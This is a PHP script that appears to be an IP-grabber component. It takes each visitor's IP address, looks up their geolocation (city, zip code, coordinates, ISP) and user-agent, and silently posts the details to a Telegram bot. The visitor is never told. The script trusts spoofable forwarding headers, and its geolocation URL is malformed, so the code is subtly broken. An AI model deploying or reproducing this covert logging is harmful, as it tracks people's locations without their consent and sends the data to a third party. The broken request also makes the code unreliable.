<?php

// Function to get the client's IP address
function getClientIP() {
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Get the client's IP address
$ip = getClientIP();

// API URL for IP geolocation
$apiUrl = "https://api.ipgeolocation.io/ipgeo?apiKey=your_api_key={$ip}";

// Initialize cURL session
$curl = curl_init();

// Set the cURL options
curl_setopt_array($curl, array(
  CURLOPT_URL => $apiUrl,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

// Execute cURL request and store the response
$response = curl_exec($curl);

// Check for errors
if(curl_errno($curl)) {
    echo 'Curl error: ' . curl_error($curl);
    curl_close($curl);
    exit;
}

// Close the cURL session
curl_close($curl);

// Decode the JSON response into an array
$data = json_decode($response, true);

// Extract relevant details
$regionName = $data['state_prov'];
$city = $data['city'];
$zip = $data['zipcode'];
$country = $data['country_name'];
$country_code = $data['calling_code'];
$timezone_name = $data['time_zone']['name'];  // Get timezone name
$current_time = $data['time_zone']['current_time']; // Get current time
$ip_address = $data['ip']; // Get IP address
$latitude = $data['latitude']; // Get latitude
$longitude = $data['longitude']; // Get longitude
$isp = $data['isp']; // Get ISP
$organization = $data['organization']; // Get organization
$currency_code = $data['currency']['code']; // Get currency code
$currency_name = $data['currency']['name']; // Get currency name
$currency_symbol = $data['currency']['symbol']; // Get currency symbol
$country_flag = $data['country_flag']; // Get country flag image URL
$country_emoji = $data['country_emoji']; // Get country emoji
$user_agent = $_SERVER['HTTP_USER_AGENT']; // Get user-agent

// Prepare the message to send
$message = "IP Details:\n";
$message .= "City: {$city}\n";
$message .= "Zipcode: {$zip}\n";
$message .= "Country Name: {$country}\n";
$message .= "Mobile (Calling Code): {$country_code}\n";
$message .= "\"time_zone\": {\"name\": \"{$timezone_name}\"}\n";
$message .= "\"current_time\": \"{$current_time}\"\n";
$message .= "\"ip\": \"{$ip_address}\"\n";
$message .= "State/Province: {$regionName}\n";
$message .= "Latitude: {$latitude}\n";
$message .= "Longitude: {$longitude}\n";
$message .= "ISP: {$isp}\n";
$message .= "Organization: {$organization}\n";
$message .= "Currency Code: {$currency_code}\n";
$message .= "Currency Name: {$currency_name}\n";
$message .= "Currency Symbol: {$currency_symbol}\n";
$message .= "Country Flag: {$country_flag}\n";
$message .= "Country Emoji: {$country_emoji}\n";
$message .= "User-Agent: {$user_agent}\n";

// Telegram bot API URL to send the message
$telegramBotToken = '';
$chatId = '';
$telegramApiUrl = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($message);

// Send the message to Telegram
file_get_contents($telegramApiUrl);

?>




